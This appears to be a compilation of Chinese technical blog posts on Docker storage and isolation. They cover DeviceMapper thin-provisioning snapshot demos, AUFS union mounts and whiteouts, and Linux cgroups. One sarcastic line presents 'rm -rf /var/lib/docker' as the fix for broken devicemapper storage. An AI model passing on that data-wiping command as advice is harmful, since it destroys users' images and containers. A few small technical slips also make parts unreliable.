你会发现生成output.c正好也是59959行代码，一分不差，probably yes终于变成了definitely yes。同时也可以看到，cuckoo filter真的很快！如果你想看hashing的整个过程，可以参照[README](https://github.com/begeekmyfriend/CuckooFilter/blob/master/README.md)里把调试宏打开。最后，欢迎给[这个小玩意](https://github.com/begeekmyfriend/CuckooFilter)提交PR！

#### 参考资料

Cuckoo Filter的[论文](http://www.cs.cmu.edu/~binfan/papers/conext14_cuckoofilter.pdf)和[PPT](http://www.cs.cmu.edu/~binfan/papers/conext14_cuckoofilter.pptx)：Cuckoo Filter: Practically Better Than Bloom

# DOCKER基础技术：DEVICEMAPPER

#####  [2015年08月26日 ](https://coolshell.cn/articles/17200.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [25 条评论](https://coolshell.cn/articles/17200.html#comments) 72,172 人阅读

![how_to_set_up_an_iSCSI_LUN_with_thin](photo/how_to_set_up_an_iSCSI_LUN_with_thin-300x150.jpg)在上一篇[介绍AUFS的文章](https://coolshell.cn/articles/17061.html)中，大家可以看到，Docker的分层镜像是怎么通过UnionFS这种文件系统做到的，但是，因为Docker首选的AUFS并不在Linux的内核主干里，所以，对于非Ubuntu的Linux分发包，比如CentOS，就无法使用AUFS作为Docker的文件系统了。于是作为第二优先级的DeviceMapper就被拿出来做分层镜像的一个实现。

目录



[Device Mapper 简介](https://coolshell.cn/articles/17200.html#Device_Mapper_简介)[Thin Provisioning 简介](https://coolshell.cn/articles/17200.html#Thin_Provisioning_简介)[Thin Provisioning Snapshot 演示](https://coolshell.cn/articles/17200.html#Thin_Provisioning_Snapshot_演示)[Docker的DeviceMapper](https://coolshell.cn/articles/17200.html#Docker的DeviceMapper)[Device Mapper 行不行？](https://coolshell.cn/articles/17200.html#Device_Mapper_行不行？)

#### Device Mapper 简介

DeviceMapper自Linux 2.6被引入成为了Linux最重要的一个技术。它在内核中支持逻辑卷管理的通用设备映射机制，它为实现用于存储资源管理的块设备驱动提供了一个高度模块化的内核架构，它包含三个重要的对象概念，Mapped Device、Mapping Table、Target device。

Mapped Device 是一个逻辑抽象，可以理解成为内核向外提供的逻辑设备，它通过Mapping Table描述的映射关系和 Target Device 建立映射。Target device 表示的是 Mapped Device 所映射的物理空间段，对 Mapped Device 所表示的逻辑设备来说，就是该逻辑设备映射到的一个物理设备。

Mapping Table里有 Mapped Device 逻辑的起始地址、范围、和表示在 Target Device 所在物理设备的地址偏移量以及Target 类型等信息（注：这些地址和偏移量都是以磁盘的扇区为单位的，即 512 个字节大小，所以，当你看到128的时候，其实表示的是128*512=64K）。



DeviceMapper 中的逻辑设备Mapped Device不但可以映射一个或多个物理设备Target Device，还可以映射另一个Mapped Device，于是，就是构成了一个迭代或递归的情况，就像文件系统中的目录里除了文件还可以有目录，理论上可以无限嵌套下去。

DeviceMapper在内核中通过一个一个模块化的 Target Driver 插件实现对 IO 请求的过滤或者重新定向等工作，当前已经实现的插件包括软 Raid、加密、多路径、镜像、快照等，这体现了在 Linux 内核设计中策略和机制分离的原则。如下图所示。从图中，我们可以**看到DeviceMapper只是一个框架，在这个框架上，我们可以插入各种各样的策略**（让我不自然地想到了面向对象中的策略模式），在这诸多“插件”中，**有一个东西叫Thin Provisioning Snapshot，这是Docker使用DeviceMapper中最重要的模块**。

![图片来源：http://people.redhat.com/agk/talks/FOSDEM_2005/](photo/device.mapper.2.gif)图片来源：[http://people.redhat.com/agk/talks/FOSDEM_2005/](https://people.redhat.com/agk/talks/FOSDEM_2005/)

#### **Thin Provisioning 简介**

Thin Provisioning要怎么翻译成中文，真是一件令人头痛的事，我就不翻译了。这个技术是虚拟化技术中的一种。它是什么意思呢？**你可以联想一下我们计算机中的内存管理中用到的——“虚拟内存技术”**——操作系统给每个进程N多N多用不完的内址地址（32位下，每个进程可以有最多2GB的内存空间），但是呢，我们知道，物理内存是没有那么多的，如果按照进程内存和物理内存一一映射来玩的话，那么，我们得要多少的物理内存啊。所以，操作系统引入了虚拟内存的设计，**意思是，我逻辑上给你无限多的内存，但是实际上是实报实销**，因为我知道你一定用不了那么多，于是，达到了内存使用率提高的效果。（今天云计算中很多所谓的虚拟化其实完全都是在用和“虚拟内存”相似的Thin Provisioning的技术，所谓的超配，或是超卖）

 

好了，话题拉回来，我们这里说的是存储。看下面两个图（[图片来源](http://www.architecting.it/2009/06/04/enterprise-computing-why-thin-provisioning-is-not-the-holy-grail-for-utilisation/)），第一个是Fat Provisioning，第二个是Thin Provisioning，其很好的说明了是个怎么一回事（和虚拟内存是一个概念）

![thin-provisioning-1](photo/thin-provisioning-1.jpg)![thin-provisioning-2](photo/thin-provisioning-2.jpg)

那么，Docker是怎么使用Thin Provisioning这个技术做到像UnionFS那样的分层镜像的呢？答案是，Docker使用了Thin Provisioning的Snapshot的技术。下面我们来介绍一下Thin Provisioning的Snapshot。

#### Thin Provisioning Snapshot 演示

下面，我们用一系列的命令来演示一下Device Mapper的Thin Provisioning Snapshot是怎么玩的。

首先，我们需要先建两个文件，一个是data.img，一个是meta.data.img：

```
~hchen$ sudo dd if=/dev/zero of=/tmp/data.img bs=1K count=1 seek=10M
1+0 records in
1+0 records out
1024 bytes (1.0 kB) copied, 0.000621428 s, 1.6 MB/s

~hchen$ sudo dd if=/dev/zero of=/tmp/meta.data.img bs=1K count=1 seek=1G
1+0 records in
1+0 records out
1024 bytes (1.0 kB) copied, 0.000140858 s, 7.3 MB/s
```

注意命令中`seek`选项，其表示为略过`of`选项指定的输出文件的前10G个output的bloksize的空间后再写入内容。因为bs是1个字节，所以也就是10G的尺寸，但其实在硬盘上是没有占有空间的，占有空间只有1k的内容。当向其写入内容时，才会在硬盘上为其分配空间。我们可以用ls命令看一下，实际分配了12K和4K。

```
~hchen$ sudo ls -lsh /tmp/data.img
12K -rw-r--r--. 1 root root 11G Aug 25 23:01 /tmp/data.img

~hchen$ sudo ls -slh /tmp/meta.data.img
4.0K -rw-r--r--. 1 root root 101M Aug 25 23:17 /tmp/meta.data.img
```

然后，我们为这个文件创建一个loopback设备。（loop2015和loop2016是我乱取的两个名字）

```
~hchen$ sudo losetup /dev/loop2015 /tmp/data.img
~hchen$ sudo losetup /dev/loop2016 /tmp/meta.data.img

~hchen$ sudo losetup -a
/dev/loop2015: [64768]:103991768 (/tmp/data.img)
/dev/loop2016: [64768]:103991765 (/tmp/meta.data.img)
```

现在，我们为这个设备建一个Thin Provisioning的Pool，用dmsetup命令：

```
~hchen$ sudo dmsetup create hchen-thin-pool \
                  --table "0 20971522 thin-pool /dev/loop2016 /dev/loop2015 \
                           128 65536 1 skip_block_zeroing"
```

其中的参数解释如下（更多信息可参看[Thin Provisioning的man page](https://github.com/torvalds/linux/blob/master/Documentation/device-mapper/thin-provisioning.txt)）：

- dmsetup create是用来创建thin pool的命令
- hchen-thin-pool 是自定义的一个pool名，不冲突就好。
- –table是这个pool的参数设置
  - 0代表起的sector位置
  - 20971522代码结句的sector号，前面说过，一个sector是512字节，所以，20971522个正好是10GB
  - /dev/loop2016是meta文件的设备（前面我们建好了）
  - /dev/loop2015是data文件的设备（前面我们建好了）
  - 128是最小的可分配的sector数
  - 65536是最少可用sector的water mark，也就是一个threshold
  - 1 代表有一个附加参数
  - skip_block_zeroing是个附加参数，表示略过用0填充的块

然后，我们就可以看到一个Device Mapper的设备了：

```
~hchen$ sudo ll /dev/mapper/hchen-thin-pool
lrwxrwxrwx. 1 root root 7 Aug 25 23:24 /dev/mapper/hchen-thin-pool -> ../dm-4
```

接下来，我们的初始还没有完成，还要创建一个Thin Provisioning 的 Volume：

```
~hchen$ sudo dmsetup message /dev/mapper/hchen-thin-pool 0 "create_thin 0"
~hchen$ sudo dmsetup create hchen-thin-volumn-001 \
            --table "0 2097152 thin /dev/mapper/hchen-thin-pool 0"
```

其中：

- 第一个命令中的create_thin是关键字，后面的0表示这个Volume的device 的 id
- 第二个命令，是真正的为这个Volumn创建一个可以mount的设备，名字叫hchen-thin-volumn-001。2097152只有1GB

好了，在mount前，我们还要格式化一下：

```
~hchen$ sudo mkfs.ext4 /dev/mapper/hchen-thin-volumn-001
mke2fs 1.42.9 (28-Dec-2013)
Discarding device blocks: done
Filesystem label=
OS type: Linux
Block size=4096 (log=2)
Fragment size=4096 (log=2)
Stride=16 blocks, Stripe width=16 blocks
65536 inodes, 262144 blocks
13107 blocks (5.00%) reserved for the super user
First data block=0
Maximum filesystem blocks=268435456
8 block groups
32768 blocks per group, 32768 fragments per group
8192 inodes per group
Superblock backups stored on blocks:
32768, 98304, 163840, 229376

Allocating group tables: done
Writing inode tables: done
Creating journal (8192 blocks): done
Writing superblocks and filesystem accounting information: done
```

好了，我们可以mount了（下面的命令中，我还创建了一个文件）

```
~hchen$ sudo mkdir -p /mnt/base
~hchen$ sudo mount /dev/mapper/hchen-thin-volumn-001 /mnt/base
~hchen$ sudo echo "hello world, I am a base" > /mnt/base/id.txt
~hchen$ sudo cat /mnt/base/id.txt
hello world, I am a base
```

好了，接下来，我们来看看snapshot怎么搞：

```
~hchen$ sudo dmsetup message /dev/mapper/hchen-thin-pool 0 "create_snap 1 0"
~hchen$ sudo dmsetup create mysnap1 \
                   --table "0 2097152 thin /dev/mapper/hchen-thin-pool 1"

~hchen$ sudo ll /dev/mapper/mysnap1
lrwxrwxrwx. 1 root root 7 Aug 25 23:49 /dev/mapper/mysnap1 -> ../dm-5
```

上面的命令中：

- 第一条命令是向hchen-thin-pool发一个create_snap的消息，后面跟两个id，第一个是新的dev id，第二个是要从哪个已有的dev id上做snapshot（0这个dev id是我们前面就创建了了）

- 第二条命令是创建一个mysnap1的device，并可以被mount。

下面我们来看看：

```
~hchen$ sudo mkdir -p /mnt/mysnap1
~hchen$ sudo mount /dev/mapper/mysnap1 /mnt/mysnap1

~hchen$ sudo ll /mnt/mysnap1/
total 20
-rw-r--r--. 1 root root 25 Aug 25 23:46 id.txt
drwx------. 2 root root 16384 Aug 25 23:43 lost+found

~hchen$ sudo cat /mnt/mysnap1/id.txt
hello world, I am a base
```

我们来修改一下/mnt/mysnap1/id.txt，并加上一个snap1.txt的文件：

```
~hchen$ sudo echo "I am snap1" >> /mnt/mysnap1/id.txt
~hchen$ sudo echo "I am snap1" > /mnt/mysnap1/snap1.txt

~hchen$ sudo cat /mnt/mysnap1/id.txt
hello world, I am a base
I am snap1

~hchen$ sudo cat /mnt/mysnap1/snap1.txt
I am snap1
```

我们再看一下/mnt/base，你会发现没有什么变化：

```
~hchen$ sudo ls /mnt/base
id.txt      lost+found
~hchen$ sudo cat /mnt/base/id.txt
hello world, I am a base
```

你是不是已经看到了分层镜像的样子了？

你还要吧继续在刚才的snapshot上再建一个snapshot

```
~hchen$ sudo dmsetup message /dev/mapper/hchen-thin-pool 0 "create_snap 2 1"
~hchen$ sudo dmsetup create mysnap2 \
                   --table "0 2097152 thin /dev/mapper/hchen-thin-pool 2"

~hchen$ sudo ll /dev/mapper/mysnap2
lrwxrwxrwx. 1 root root 7 Aug 25 23:52 /dev/mapper/mysnap1 -> ../dm-7

~hchen$ sudo mkdir -p /mnt/mysnap2
~hchen$ sudo mount /dev/mapper/mysnap2 /mnt/mysnap2
~hchen$ sudo  ls /mnt/mysnap2
id.txt  lost+found  snap1.txt 
```

好了，我相信你看到了分层镜像的样子了。

看完演示，我们再来补点理论知识吧：

- Snapshot来自LVM（Logic Volumn Manager），它可以在不中断服务的情况下为某个device打一个快照。
- Snapshot是Copy-On-Write的，也就是说，只有发生了修改，才会对对应的内存进行拷贝。

另外，这里有篇文章[Storage thin provisioning benefits and challenges](http://searchstorage.techtarget.com/tip/Storage-thin-provisioning-benefits-and-challenges)可以前往一读。

#### Docker的DeviceMapper

上面基本上就是Docker的玩法了，我们可以看一下docker的loopback设备：

```
~hchen $ sudo losetup -a
/dev/loop0: [64768]:38050288 (/var/lib/docker/devicemapper/devicemapper/data)
/dev/loop1: [64768]:38050289 (/var/lib/docker/devicemapper/devicemapper/metadata)
```

其中data 100GB，metadata 2.0GB

```
~hchen $ sudo ls -alhs /var/lib/docker/devicemapper/devicemapper
506M -rw-------. 1 root root 100G Sep 10 20:15 data
1.1M -rw-------. 1 root root 2.0G Sep 10 20:15 metadata 
```

下面是相关的thin-pool。其中，有个当一大串hash串的device是正在启动的容器：

```
~hchen $ sudo ll /dev/mapper/dock*
lrwxrwxrwx. 1 root root 7 Aug 25 07:57 /dev/mapper/docker-253:0-104108535-pool -> ../dm-2
lrwxrwxrwx. 1 root root 7 Aug 25 11:13 /dev/mapper/docker-253:0-104108535-deefcd630a60aa5ad3e69249f58a68e717324be4258296653406ff062f605edf -> ../dm-3
```

我们可以看一下它的device id（Docker都把它们记下来了）：

```
~hchen $ sudo cat /var/lib/docker/devicemapper/metadata/deefcd630a60aa5ad3e69249f58a68e717324be4258296653406ff062f605edf
{"device_id":24,"size":10737418240,"transaction_id":26,"initialized":false}
```

device_id是24，size是10737418240，除以512，就是20971520 个 sector，我们用这些信息来做个snapshot看看（注：我用了一个比较大的dev id – 1024）：

```
~hchen$ sudo dmsetup message "/dev/mapper/docker-253:0-104108535-pool" 0 \
                                    "create_snap 1024 24"
~hchen$ sudo dmsetup create dockersnap --table \
                    "0 20971520 thin /dev/mapper/docker-253:0-104108535-pool 1024"
~hchen$ sudo mkdir /mnt/docker
~hchen$ sudo mount /dev/mapper/dockersnap /mnt/docker/
~hchen$ sudo ls /mnt/docker/
id lost+found rootfs
~hchen$ sudo ls /mnt/docker/rootfs/
bin dev etc home lib lib64 lost+found media mnt opt proc root run sbin srv sys tmp usr var
```

我们在docker的容器里用findmnt命令也可以看到相关的mount的情况（因为太长，下面只是摘要）：

```
# findmnt
TARGET                SOURCE               
/                 /dev/mapper/docker-253:0-104108535-deefcd630a60[/rootfs]
/etc/resolv.conf  /dev/mapper/centos-root[/var/lib/docker/containers/deefcd630a60/resolv.conf]
/etc/hostname     /dev/mapper/centos-root[/var/lib/docker/containers/deefcd630a60/hostname]
/etc/hosts        /dev/mapper/centos-root[/var/lib/docker/containers/deefcd630a60/hosts]
```

#### Device Mapper 行不行？

Thin Provisioning的文档中说，这还处理实验阶段，不要上Production.

> These targets are very much still in the EXPERIMENTAL state. Please do not yet rely on them in production.

另外，Jeff Atwood在Twitter上发过这样的一推

[![Jeff.Atwood.DeviceMapper](photo/Jeff.Atwood.DeviceMapper.png)](https://twitter.com/codinghorror/status/604096348682485760)

这个推指向的[这个讨论](https://forums.docker.com/t/rmi-not-freeing-disk-space-in-devicemapper-sparse-file-centos-6-6/1640/3)中，其中指向了这个[code diff](https://github.com/discourse/discourse_docker/commit/48f22d14f39496c8df446cbc65ee04b258c5a1a0)，基本上就是说，DeviceMapper这种东西问题太多了，我们应该把其加入黑名单。Doker的Founder也这样回复到：

[![img](photo/Solomon.Hykeys.DeviceMapper.png)](https://twitter.com/solomonstre/status/604055267303636992)

所以，如果你在使用loopback的devicemapper的话，当你的存储出现了问题后，正确的解决方案是：

rm -rf /var/lib/docker

（全文完）

# DOCKER基础技术：AUFS

#####  [2015年08月24日 ](https://coolshell.cn/articles/17061.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [42 条评论](https://coolshell.cn/articles/17061.html#comments) 91,656 人阅读

[![docker-filesystems-busyboxrw](photo/docker-filesystems-busyboxrw-300x225.png)](https://coolshell.cn/wp-content/uploads/2015/08/docker-filesystems-busyboxrw.png)AUFS是一种Union File System，所谓UnionFS就是把不同物理位置的目录合并mount到同一个目录中。UnionFS的一个最主要的应用是，把一张CD/DVD和一个硬盘目录给联合 mount在一起，然后，你就可以对这个只读的CD/DVD上的文件进行修改（当然，修改的文件存于硬盘上的目录里）。

AUFS又叫Another UnionFS，后来叫Alternative UnionFS，后来可能觉得不够霸气，叫成Advance UnionFS。是个叫Junjiro Okajima（岡島順治郎）在2006年开发的，AUFS完全重写了早期的UnionFS 1.x，其主要目的是为了可靠性和性能，并且引入了一些新的功能，比如可写分支的负载均衡。AUFS在使用上全兼容UnionFS，而且比之前的UnionFS在稳定性和性能上都要好很多，后来的UnionFS 2.x开始抄AUFS中的功能。但是他居然没有进到Linux主干里，就是因为Linus不让，基本上是因为代码量比较多，而且写得烂（相对于只有3000行的union mount和10000行的UnionFS，以及其它平均下来只有6000行代码左右的VFS，AUFS居然有30000行代码），所以，岡島不断地改进代码质量，不断地提交，不断地被Linus拒掉，所以，到今天AUFS都还进不了Linux主干（今天你可以看到AUFS的代码其实还好了，比起OpenSSL好N倍，要么就是Linus对代码的质量要求非常高，要么就是Linus就是不喜欢AUFS）。

不过，好在有很多发行版都用了AUFS，比如：Ubuntu 10.04，Debian6.0, Gentoo Live CD支持AUFS，所以，也OK了。

好了，扯完这些闲话，我们还是看一个示例吧（环境：Ubuntu 14.04）



首先，我们建上两个目录（水果和蔬菜），并在这两个目录中放上一些文件，水果中有苹果和蕃茄，蔬菜有胡萝卜和蕃茄。

$ tree

.

├── fruits

│   ├── apple

│   └── tomato

└── vegetables

​    ├── carrots

​    └── tomato

然后，我们输入以下命令：

\# 创建一个mount目录

$ mkdir mnt

\# 把水果目录和蔬菜目录union mount到 ./mnt目录中

$ sudo mount -t aufs -o dirs=./fruits:./vegetables none ./mnt

\#  查看./mnt目录

$ tree ./mnt

./mnt

├── apple

├── carrots

└── tomato

我们可以看到在./mnt目录下有三个文件，苹果apple、胡萝卜carrots和蕃茄tomato。水果和蔬菜的目录被union到了./mnt目录下了。

我们来修改一下其中的文件内容：

$ echo mnt > ./mnt/apple

$ cat ./mnt/apple

mnt

$ cat ./fruits/apple

mnt

上面的示例，我们可以看到./mnt/apple的内容改了，./fruits/apple的内容也改了。

$ echo mnt_carrots > ./mnt/carrots

$ cat ./vegetables/carrots 

$ cat ./fruits/carrots

mnt_carrots

上面的示例，我们可以看到，我们修改了./mnt/carrots的文件内容，./vegetables/carrots并没有变化，反而是./fruits/carrots的目录中出现了carrots文件，其内容是我们在./mnt/carrots里的内容。

也就是说，我们在mount aufs命令中，我们没有指它vegetables和fruits的目录权限，默认上来说，命令行上第一个（最左边）的目录是可读可写的，后面的全都是只读的。（一般来说，最前面的目录应该是可写的，而后面的都应该是只读的）

所以，如果我们像下面这样指定权限来mount aufs，你就会发现有不一样的效果（记得先把上面./fruits/carrots的文件删除了）：

$ sudo mount -t aufs -o dirs=./fruits=rw:./vegetables=rw none ./mnt

$ echo "mnt_carrots" > ./mnt/carrots 

$ cat ./vegetables/carrots

mnt_carrots

$ cat ./fruits/carrots

cat: ./fruits/carrots: No such file or directory

现在，在这情况下，如果我们要修改./mnt/tomato这个文件，那么究竟是哪个文件会被改写？

$ echo "mnt_tomato" > ./mnt/tomato 

$ cat ./fruits/tomato

mnt_tomato

$ cat ./vegetables/tomato

I am a vegetable

可见，如果有重复的文件名，在mount命令行上，越往前的就优先级越高。

你可以用这个例子做一些各种各样的试验，我这里主要是给大家一个感性认识，就不展开试验下去了。

那么，这种UnionFS有什么用？

历史上，有一个叫[Knoppix的Linux发行版](https://zh.wikipedia.org/wiki/Knoppix)，其主要用于Linux演示、光盘教学、系统急救，以及商业产品的演示，不需要硬盘安装，直接把CD/DVD上的image运行在一个可写的存储设备上（比如一个U盘上），其实，也就是把CD/DVD这个文件系统和USB这个可写的系统给联合mount起来，这样你对CD/DVD上的image做的任何改动都会在被应用在U盘上，于是乎，你可以对CD/DVD上的内容进行任意的修改，因为改动都在U盘上，所以你改不坏原来的东西。

我们可以再发挥一下想像力，你也可以把一个目录，比如你的源代码，作为一个只读的template，和另一个你的working directory给union在一起，然后你就可以做各种修改而不用害怕会把源代码改坏了。有点像一个ad hoc snapshot。

Docker把UnionFS的想像力发挥到了容器的镜像。你是否还记得我在[介绍Linux Namespace上篇](https://coolshell.cn/articles/17010.html)中用mount namespace和chroot山寨了一镜像。现在当你看过了这个UnionFS的技术后，你是不是就明白了，你完全可以用UnionFS这样的技术做出分层的镜像来。

下图来自Docker的官方文档[Layer](http://docs.docker.com/terms/layer/)，其很好的展示了Docker用UnionFS搭建的分层镜像。

![docker-filesystems-multilayer](photo/docker-filesystems-multilayer.png)

关于docker的分层镜像，除了aufs，docker还支持btrfs, devicemapper和vfs，你可以使用 -s 或 –storage-driver= 选项来指定相关的镜像存储。在Ubuntu 14.04下，docker默认Ubuntu的 aufs（在CentOS7下，用的是devicemapper，关于devicemapper，我会以以后的文章中讲解）你可以在下面的目录中查看相关的每个层的镜像：



/var/lib/docker/aufs/diff/<id> 



在docker执行起来后（比如：docker run -it ubuntu /bin/bash ），你可以从/sys/fs/aufs/si_[id]目录下查看aufs的mount的情况，下面是个示例：

\#ls /sys/fs/aufs/si_b71b209f85ff8e75/

br0      br2      br4      br6      brid1    brid3    brid5    xi_path

br1      br3      br5      brid0    brid2    brid4    brid6 

\# cat /sys/fs/aufs/si_b71b209f85ff8e75/*

/var/lib/docker/aufs/diff/87315f1367e5703f599168d1e17528a0500bd2e2df7d2fe2aaf9595f3697dbd7=rw

/var/lib/docker/aufs/diff/87315f1367e5703f599168d1e17528a0500bd2e2df7d2fe2aaf9595f3697dbd7-init=ro+wh

/var/lib/docker/aufs/diff/d0955f21bf24f5bfffd32d2d0bb669d0564701c271bc3dfc64cfc5adfdec2d07=ro+wh

/var/lib/docker/aufs/diff/9fec74352904baf5ab5237caa39a84b0af5c593dc7cc08839e2ba65193024507=ro+wh

/var/lib/docker/aufs/diff/a1a958a248181c9aa6413848cd67646e5afb9797f1a3da5995c7a636f050f537=ro+wh

/var/lib/docker/aufs/diff/f3c84ac3a0533f691c9fea4cc2ceaaf43baec22bf8d6a479e069f6d814be9b86=ro+wh

/var/lib/docker/aufs/diff/511136ea3c5a64f264b78b5433614aec563103b4d4702f3ba7d4d2698e22c158=ro+wh

64

65

66

67

68

69

70

/run/shm/aufs.xino

你会看到只有最顶上的层（branch）是rw权限，其它的都是ro+wh权限只读的。

关于docker的aufs的配置，你可以在/var/lib/docker/repositories-aufs这个文件中看到。

目录



[AUFS的一些特性](https://coolshell.cn/articles/17061.html#AUFS的一些特性)[相关术语](https://coolshell.cn/articles/17061.html#相关术语)[相关问题](https://coolshell.cn/articles/17061.html#相关问题)[AUFS的性能](https://coolshell.cn/articles/17061.html#AUFS的性能)[延伸阅读](https://coolshell.cn/articles/17061.html#延伸阅读)

#### AUFS的一些特性

AUFS有所有Union FS的特性，把多个目录，合并成同一个目录，并可以为每个需要合并的目录指定相应的权限，实时的添加、删除、修改已经被mount好的目录。而且，他还能在多个可写的branch/dir间进行负载均衡。

上面的例子，我们已经看到AUFS的mount的示例了。下面我们来看一看被union的目录（分支）的相关权限：

- rw表示可写可读read-write。
- ro表示read-only，如果你不指权限，那么除了第一个外ro是默认值，对于ro分支，其永远不会收到写操作，也不会收到查找whiteout的操作。
- rr表示real-read-only，与read-only不同的是，rr标记的是天生就是只读的分支，这样，AUFS可以提高性能，比如不再设置inotify来检查文件变动通知。

权限中，我们看到了一个术语：whiteout，下面我来解释一下这个术语。

一般来说ro的分支都会有wh的属性，比如 “[dir]=ro+wh”。所谓whiteout的意思，如果在union中删除的某个文件，实际上是位于一个readonly的分支（目录）上，那么，在mount的union这个目录中你将看不到这个文件，但是read-only这个层上我们无法做任何的修改，所以，我们就需要对这个readonly目录里的文件作whiteout。AUFS的whiteout的实现是通过在上层的可写的目录下建立对应的whiteout隐藏文件来实现的。

看个例子：

假设我们有三个目录和文件如下所示（test是个空目录）：

\# tree

.

├── fruits

│   ├── apple

│   └── tomato

├── test

└── vegetables

​    ├── carrots

​    └── tomato

我们如下mount：

\# mkdir mnt

\# mount -t aufs -o dirs=./test=rw:./fruits=ro:./vegetables=ro none ./mnt

\# # ls ./mnt/

apple  carrots  tomato 

现在我们在权限为rw的test目录下建个whiteout的隐藏文件.wh.apple，你就会发现./mnt/apple这个文件就消失了:

 \# touch ./test/.wh.apple

\# ls ./mnt

carrots  tomato

上面这个操作和 rm ./mnt/apple是一样的。

##### 相关术语

**Branch** – 就是各个要被union起来的目录（就是我在上面使用的dirs的命令行参数）

- Branch根据被union的顺序形成一个stack，一般来说最上面的是可写的，下面的都是只读的。
- Branch的stack可以在被mount后进行修改，比如：修改顺序，加入新的branch，或是删除其中的branch，或是直接修改branch的权限

**Whiteout** 和 **Opaque**

- 如果UnionFS中的某个目录被删除了，那么就应该不可见了，就算是在底层的branch中还有这个目录，那也应该不可见了。

- Whiteout就是某个上层目录覆盖了下层的相同名字的目录。用于隐藏低层分支的文件，也用于阻止readdir进入低层分支。

- Opaque的意思就是不允许任何下层的某个目录显示出来。

- 在隐藏低层档的情况下，whiteout的名字是’.wh.<filename>’。

- 在阻止readdir的情况下，名字是’.wh..wh..opq’或者 ’.wh.__dir_opaque’。

##### 相关问题

看到上面这些，你一定会有几个问题：

**其一、你可能会问，要有文件在原来的地方被修改了会怎么样？**mount的目录会一起改变吗？答案是会的，也可以是不会的。因为你可以指定一个叫udba的参数（全称：User’s Direct Branch Access），这个参数有三个取值：

- **udba=none** – 设置上这个参数后，AUFS会运转的更快，因为那些不在mount目录里发生的修改，aufs不会同步过来了，所以会有数据出错的问题。
- **udba=reval** – 设置上这个参数后，AUFS会去查文件有没有被更新，如果有的话，就会把修改拉到mount目录内。
- **udba=notify** – 这个参数会让AUFS为所有的branch注册inotify，这样可以让AUFS在更新文件修改的性能更高一些。

**其二、如果有多个rw的branch（目录）被union起来了，那么，当我创建文件的时候，aufs会创建在哪里呢？** aufs提供了一个叫create的参数可以供你来配置相当的创建策略，下面有几个例子。

**create=rr | round−robin** 轮询。下面的示例可以看到，新创建的文件轮流写到三个目录中

hchen$ sudo mount -t aufs  -o dirs=./1=rw:./2=rw:./3=rw -o create=rr none ./mnt

hchen$ touch ./mnt/a ./mnt/b ./mnt/c

hchen$ tree

.

├── 1

│   └── a

├── 2

│   └── c

└── 3

​    └── b

**create=mfs[:second] | most−free−space[:second]** 选一个可用空间最好的分支。可以指定一个检查可用磁盘空间的时间。

**create=mfsrr:low[:second]** 选一个空间大于low的branch，如果空间小于low了，那么aufs会使用 round-robin 方式。

更多的关于AUFS的细节使用参数，大家可以直接在Ubuntu 14.04下通过[ man aufs ](http://aufs.sourceforge.net/aufs3/man.html)来看一下其中的各种参数和命令。

#### AUFS的性能

AUFS的性能慢吗？也慢也不慢。因为AUFS会把所有的分支mount起来，所以，在查找文件上是比较慢了。因为它要遍历所有的branch。是个O(n)的算法（很明显，这个算法有很大的改进空间的）所以，branch越多，查找文件的性能也就越慢。但是，一旦AUFS找到了这个文件的inode，那后以后的读写和操作原文件基本上是一样的。

所以，如果你的程序跑在在AUFS下，open和stat操作会有明显的性能下降，branch越多，性能越差，但是在write/read操作上，性能没有什么变化。

IBM的研究中心对Docker的性能给了一份非常不错的性能报告（PDF）《[An Updated Performance Comparison of Virtual Machinesand Linux Containers](http://domino.research.ibm.com/library/cyberdig.nsf/papers/0929052195DD819C85257D2300681E7B/$File/rc25482.pdf)》

我截了两张图出来，第一张是顺序读写，第二张是随机读写。基本没有什么性能损失的问题。而KVM在随机读写的情况也就有点慢了（但是，如果硬盘是SSD的呢？）

[![img](photo/docker.seq_.jpg)](https://coolshell.cn/wp-content/uploads/2015/08/docker.seq_.jpg)

 

**顺序读写**

[![img](photo/docker.rand_.jpg)](https://coolshell.cn/wp-content/uploads/2015/08/docker.rand_.jpg)

 

**随机读写**

#### 延伸阅读

- [Introduce UnionFS](http://www.linuxjournal.com/article/7714)
- [Union file systems: Implementations, part I](http://lwn.net/Articles/325369/)
- [Union file systems: Implementations, part 2](http://lwn.net/Articles/327738/)
- [Another union filesystem approach](http://lwn.net/Articles/403012/)
- [Unioning file systems: Architecture, features, and design choices](http://lwn.net/Articles/324291/)

（全文完）

# DOCKER基础技术：LINUX CGROUP

#####  [2015年04月17日 ](https://coolshell.cn/articles/17049.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [87 条评论](https://coolshell.cn/articles/17049.html#comments) 124,586 人阅读

![filter](photo/filter.png)前面，我们介绍了[Linux Namespace](https://coolshell.cn/articles/17010.html)，但是Namespace解决的问题主要是环境隔离的问题，这只是虚拟化中最最基础的一步，我们还需要解决对计算机资源使用上的隔离。也就是说，虽然你通过Namespace把我Jail到一个特定的环境中去了，但是我在其中的进程使用用CPU、内存、磁盘等这些计算资源其实还是可以随心所欲的。所以，我们希望对进程进行资源利用上的限制或控制。这就是Linux CGroup出来了的原因。

Linux CGroup全称Linux Control Group， 是Linux内核的一个功能，用来限制，控制与分离一个进程组群的资源（如CPU、内存、磁盘输入输出等）。这个项目最早是由Google的工程师在2006年发起（主要是Paul Menage和Rohit Seth），最早的名称为进程容器（process containers）。在2007年时，因为在Linux内核中，容器（container）这个名词太过广泛，为避免混乱，被重命名为cgroup，并且被合并到2.6.24版的内核中去。然后，其它开始了他的发展。

Linux CGroupCgroup 可让您为系统中所运行任务（进程）的用户定义组群分配资源 — 比如 CPU 时间、系统内存、网络带宽或者这些资源的组合。您可以监控您配置的 cgroup，拒绝 cgroup 访问某些资源，甚至在运行的系统中动态配置您的 cgroup。

主要提供了如下功能：



- **Resource limitation**: 限制资源使用，比如内存使用上限以及文件系统的缓存限制。
- **Prioritization**: 优先级控制，比如：CPU利用和磁盘IO吞吐。
- **Accounting**: 一些审计或一些统计，主要目的是为了计费。
- **Control**: 挂起进程，恢复执行进程。

使用 cgroup，系统管理员可更具体地控制对系统资源的分配、优先顺序、拒绝、管理和监控。可更好地根据任务和用户分配硬件资源，提高总体效率。

在实践中，系统管理员一般会利用CGroup做下面这些事（有点像为某个虚拟机分配资源似的）：

- 隔离一个进程集合（比如：nginx的所有进程），并限制他们所消费的资源，比如绑定CPU的核。
- 为这组进程 分配其足够使用的内存
- 为这组进程分配相应的网络带宽和磁盘存储限制
- 限制访问某些设备（通过设置设备的白名单）

